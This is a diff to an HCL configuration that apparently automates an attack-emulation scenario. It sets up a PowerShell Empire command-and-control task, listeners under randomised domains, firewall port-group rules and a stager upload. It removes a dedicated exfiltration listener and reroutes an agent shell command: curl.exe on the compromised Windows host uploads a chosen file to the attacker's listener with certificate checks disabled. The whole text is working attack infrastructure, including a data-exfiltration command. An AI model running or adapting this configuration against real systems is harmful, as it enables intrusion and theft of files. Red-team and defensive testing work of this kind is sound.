@@ -106,18 +106,6 @@ resource "portgroup_rule" "http_portgroup_initial_access_task" {
     ip_protocol    = "tcp"
 }
 
-resource "portgroup" "exfil_portgroup" {
-    portgroup_name        = "exfil_portgroup_${local.function.date_stamp}"
-    portgroup_description = "exfil_portgroup_${local.function.date_stamp}"
-}
-
-resource "portgroup_rule" "exfil_portgroup_initial_access_task" {
-    portgroup_name = resource.portgroup.exfil_portgroup.portgroup_name
-    ip_ranges      = "${data.tasks.initial_access_task.public_ip}/32"
-    port           = "443"
-    ip_protocol    = "tcp"
-}
-
 resource "task" "c2_task" {
     task_type  = "powershell_empire"
     task_name  = "c2_task_${local.function.date_stamp}"
@@ -191,37 +179,6 @@ resource "listener" "http_listener" {
     host_name     = "downloads-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
     depends_on    = resource.portgroup_rule.http_portgroup_initial_access_task.portgroup_name
-}
-
-resource "task" "exfil_task" {
-    task_type  = "exfilkit"
-    task_name  = "exfil_task_${local.function.date_stamp}"
-
-    listener = {
-        https = {
-            Port = "443"
-        }
-        tls = {
-            cert_type = "self-signed"
-            cert_country = "US"
-            cert_state = "California"
-            cert_locale = "San Francisco"
-            cert_org = "Havoc Inc."
-            cert_org_unit = "IT Security"
-            cert_host = "local_ip"
-        }
-    }
-}
-
-resource "listener" "exfil_listener" {
-    listener_name = "exfil_listener_${local.function.date_stamp}"
-    listener_type = "HTTPS"
-    listener_port = "443"
-    task_name     = resource.task.exfil_task.task_name
-    portgroups    = [resource.portgroup.exfil_portgroup.portgroup_name]
-    host_name     = "uploads-${resource.random_string.random_6.result}"
-    domain_name   = variable.domain_name
-    depends_on    = resource.portgroup_rule.exfil_portgroup_initial_access_task.portgroup_name
 }
 
 resource "file" "stager_upload" {
@@ -456,7 +413,7 @@ action "execute_agent_shell_command" "upload_exfil_file" {
     timeout           = "600"
     task_name         = resource.task.c2_task.task_name
     agent_name        = action.task_execute_command.execute_stager.wait_for_c2.agent_info.name
-    command           = "c:\Windows\System32\curl.exe -k -F file=@${variable.exfil_path}\${variable.exfil_file} https://${resource.listener.exfil_listener.host_name}.${resource.listener.exfil_listener.domain_name}:443/p"
+    command           = "c:\Windows\System32\curl.exe -k -F file=@${variable.exfil_path}\${variable.exfil_file} https://${resource.listener.http_listener.host_name}.${resource.listener.http_listener.domain_name}:443/upload"
     wait_for_results  = "true"
     depends_on        = action.execute_agent_shell_command.create_exfil_file
 }
